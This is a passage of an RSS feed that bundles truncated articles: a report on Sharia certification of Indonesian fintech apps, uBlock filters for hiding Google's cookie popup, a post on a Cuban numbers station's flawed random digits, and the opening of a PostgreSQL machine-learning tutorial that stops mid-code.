September 18, 2020 | https://restofworld.org/2020/now-serving-halal-apps/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/now-serving-halal-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia’s 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council’s influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma’ruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">“Shariatization” of the economy</a> — i.e., the growth of digital financial services catering to Muslim users — a priority for the country’s development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users — whether peer-to-peer lending apps, mobile money services, or online stock-trading portals — MUI acts as the arbiter of their religious legitimacy. MUI’s National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI’s religious scholars become embedded in the early evolution of a company’s digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-40x85.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-541x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-400x850.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it’s one of the country’s largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek’s digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja’s team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia’s largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses — riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin’s team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java’s Yogyakarta and author of a national bestseller promoting the vice president’s “Shariatization” worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma’ruf Amin Way</em></a><em>. </em>“They are all Sharia experts,” said Djaenudin. “They gave us guidance and consultations about the product.” </p>



<p>Starting in November 2019, shortly after the vice president’s Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI’s supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI’s rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. “O you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,” reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: “Do not sell gold for gold, and do not sell silver for silver, except in case of like for like.”</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties — users, banking institutions, or the app itself — must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-40x23.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-400x232.png 400w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-600x348.png 600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1000x580.png 1000w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1600x928.png 1600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-2800x1623.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>The supervisory board had other suggestions for LinkAja’s parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one’s total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja’s operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. “From the customer’s perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,” said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. “It’s been almost nine years, and I’m learning all of this from the day I started my business,” he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. “Some customers, they ask, ‘Are you certified, or are you just Sharia?’”&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-40x86.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-538x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-400x857.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps — waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/now-serving-halal-apps/">https://restofworld.org/2020/now-serving-halal-apps/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/now-serving-halal-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516141</guid>
            <pubDate>Fri, 18 Sep 2020 12:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting rid of the Google cookie consent popup]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 65 (<a href="https://news.ycombinator.com/item?id=24515998">thread link</a>) | @edward
<br/>
September 18, 2020 | https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_164">
        <header>
            <h2><a href="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">Getting rid of the Google cookie consent popup</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/18-Internet"><img title="Internet: Remember ... all I'm offering is the truth. Nothing more. (Morpheus to Neo who is choosing the red pill)" alt="Internet" src="https://daniel-lange.com/uploads/http.serendipityThumb.jpg"></a></p><p>If you clear your browser cookies regularly (as you should do), Google will annoy you with a full screen cookie consent overlay these days. And - of course - there is no "no tracking consent, technically required cookies only" button. You may log in to Google to set your preference. Yeah, I'm sure this is totally following the intent of the <a href="https://eur-lex.europa.eu/eli/dir/2009/136/2009-12-19">EU Directive 2009/136/EC</a> (the "cookie law").</p>

<p><!-- s9ymdb:664 --><img width="1332" height="1066" src="https://daniel-lange.com/uploads/entries/200918_Google_cookie_consent_screen.png" alt="Google cookie consent pop-up"></p>

<p>Unfortunately none of the big "anti-annoyances" filter lists seem to have picked that one up yet but the friendly folks from the <a href="https://www.computerbase.de/forum/threads/google-nervt-bevor-sie-fortfahren.1968809/">Computerbase Forum</a> [German] to the rescue. User "Sepp Depp" has created the following filter set that <abbr title="Works For Me">WFM</abbr>:</p>

<p>Add this to your <a href="https://github.com/gorhill/uBlock">uBlock Origin</a> "My filters" tab:</p>

<pre>! Google - remove cookie-consent-popup and restore scoll functionality
google.*##.wwYr3.aID8W.bErdLd
google.*##.aID8W.m114nf.t7xA6
google.*##div[jsname][jsaction^="dg_close"]
google.*##html:style(overflow: visible !important;)
google.*##.widget-consent-fullscreen.widget-consent
</pre>

                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_164.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=164"
                 dc:title="Getting rid of the Google cookie consent popup"
                 dc:identifier="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515998</guid>
            <pubDate>Fri, 18 Sep 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did a broken random number generator in Cuba help expose a Russian spy network?]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24515717">thread link</a>) | @privong
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515717</guid>
            <pubDate>Fri, 18 Sep 2020 12:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PostgreSQL and Machine Learning - step-by-step python tutorial]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515598">thread link</a>) | @pplonski86
<br/>
September 18, 2020 | https://mljar.com/blog/postgresql-machine-learning/ | <a href="https://web.archive.org/web/*/https://mljar.com/blog/postgresql-machine-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p><img src="https://raw.githubusercontent.com/mljar/mljar-examples/master/media/PostgreSQL_AutoML_v2.png" alt="PostgreSQL and Machine Learning"></p>

<p>I will show you how to apply Machine Learning algorithms on data from the PostgreSQL database to get insights and predictions. I will use an Automated Machine Learning (AutoML) <a href="https://github.com/mljar/mljar-supervised"><strong>supervised</strong></a>. It is an open-source python package. Thanks to AutoML I will get quick access to many ML algorithms: Decision Tree, Logistic Regression, Random Forest, Xgboost, Neural Network. The AutoML will handle feature engineering as well. I will show you python code snippets that can be reused to integrate Machine Learning with PostgreSQL as a part of the ETL pipeline.</p>

<p>You can find all the code used in this post in the <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML">GitHub</a>.</p>

<hr>

<h2 id="the-marketing-data">The marketing data</h2>

<p>I will use <a href="https://www.kaggle.com/yufengsui/portuguese-bank-marketing-data-set"><strong>Portugese Bank Marketing</strong></a> dataset (<code>bank_cleaned.csv</code> file). This dataset is about the marketing campaigns, which aim to promote financial products for existing customers of a Portuguese bank. The each contact to the client is described by:</p>

<div><div><pre><code><span>columns</span> <span>=</span> <span>[</span><span>"age"</span><span>,</span> <span>"job"</span><span>,</span> <span>"marital"</span><span>,</span> <span>"education"</span><span>,</span> <span>"default_payment"</span><span>,</span> <span>"balance"</span><span>,</span> <span>"housing"</span><span>,</span>
           <span>"loan"</span><span>,</span> <span>"day"</span><span>,</span> <span>"month"</span><span>,</span> <span>"duration"</span><span>,</span> <span>"campaign"</span><span>,</span> <span>"pdays"</span><span>,</span> <span>"previous"</span><span>,</span> <span>"poutcome"</span>
           <span>"response"</span> <span># the target</span>
          <span>]</span>
</code></pre></div></div>

<p>The <code>response</code> is the taget column, which contains the information if customer subscribed to the financial product. The goal of the analysis will be to predict whether customer will select the subscription.</p>

<p>In this analysis I will split the dataset into:</p>

<ul>
  <li>training data (<code>32,672</code> samples),</li>
  <li>testing data (<code>8,169</code> samples).</li>
</ul>

<p>All datasets are inserted into database, but <strong>for testing data the <code>response</code> is not inserted</strong>.</p>

<h2 id="setup-postgresql-database-in-docker">Setup PostgreSQL database in Docker</h2>

<p>I will set-up the PostgreSQL database in the docker.</p>

<p>The <code>Dockerfile</code> with PostgreSQL:</p>

<div><div><pre><code>FROM postgres:alpine
EXPOSE 5555
</code></pre></div></div>

<p>To build docker image and run container:</p>

<div><div><pre><code>docker build -t mydb:latest .
docker run --name my_local_db -e POSTGRES_PASSWORD=1234 -e POSTGRES_DB=db -p 5555:5432 mydb:latest
</code></pre></div></div>

<h2 id="create-table-and-insert-the-training-data">Create table and insert the training data</h2>

<p>For interacting with the database I will use python scripts and <code>psycopg2</code> package. To initialize the database please use the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/init_db.py"><code>init_db.py</code></a> file. Let’s dig into the code.</p>

<div><div><pre><code><span>""" init_db.py file """</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>from</span> <span>sklearn.model_selection</span> <span>import</span> <span>train_test_split</span>
<span>from</span> <span>db</span> <span>import</span> <span>db_engine</span> 

<span>create_table_sql</span> <span>=</span> <span>"""
CREATE TABLE IF NOT EXISTS marketing (
    id serial PRIMARY KEY,
    age integer,
    job varchar(128),
    marital varchar(128),
    education varchar(128),
    default_payment varchar(128),
    balance integer,
    housing varchar(128),
    loan varchar(128),
    day integer,
    month varchar(128),
    duration real,
    campaign integer, 
    pdays integer,
    previous integer,
    poutcome varchar(128),
    response varchar(128),
    predicted_response varchar(128)
)
"""</span>

<span>get_data_sql</span> <span>=</span> <span>"""select * from marketing"""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>"data/bank_cleaned.csv"</span><span>,</span> <span>index_col</span><span>=</span><span>"id"</span><span>)</span>
<span>df</span><span>.</span><span>drop</span><span>(</span><span>"response_binary"</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>,</span> <span>inplace</span><span>=</span><span>True</span><span>)</span>
<span>df</span><span>[</span><span>"predicted_response"</span><span>]</span> <span>=</span> <span>""</span>
<span>test_size</span><span>=</span> <span>0.20</span> <span># 20% for testing</span>
<span>df_train</span><span>,</span> <span>df_test</span> <span>=</span> <span>train_test_split</span><span>(</span><span>df</span><span>,</span> <span>test_size</span><span>=</span><span>test_size</span><span>,</span> <span>random_state</span><span>=</span><span>1234</span><span>)</span>
<span>df_train</span><span>.</span><span>to_csv</span><span>(</span><span>"data/train.csv"</span><span>)</span>
<span>df_test</span><span>.</span><span>to_csv</span><span>(</span><span>"data/test.csv"</span><span>)</span>
<span>df_test</span> <span>=</span> <span>df_test</span><span>.</span><span>copy</span><span>()</span>
<span>df_test</span><span>[</span><span>"response"</span><span>]</span> <span>=</span> <span>""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>df_train</span><span>,</span> <span>df_test</span><span>])</span>

<span>try</span><span>:</span>
    <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
    <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
    <span>print</span><span>(</span><span>"Create marketing table"</span><span>)</span>
    <span>cur</span><span>.</span><span>execute</span><span>(</span><span>create_table_sql</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert train and test data into table ..."</span><span>)</span>
    <span>buffer</span> <span>=</span> <span>StringIO</span><span>()</span>
    <span>df</span><span>.</span><span>to_csv</span><span>(</span><span>buffer</span><span>,</span> <span>index_label</span><span>=</span><span>"id"</span><span>,</span> <span>header</span><span>=</span><span>False</span><span>)</span>
    <span>buffer</span><span>.</span><span>seek</span><span>(</span><span>0</span><span>)</span>
    <span>cur</span><span>.</span><span>copy_from</span><span>(</span><span>buffer</span><span>,</span> <span>"marketing"</span><span>,</span> <span>sep</span><span>=</span><span>","</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert finished."</span><span>)</span>

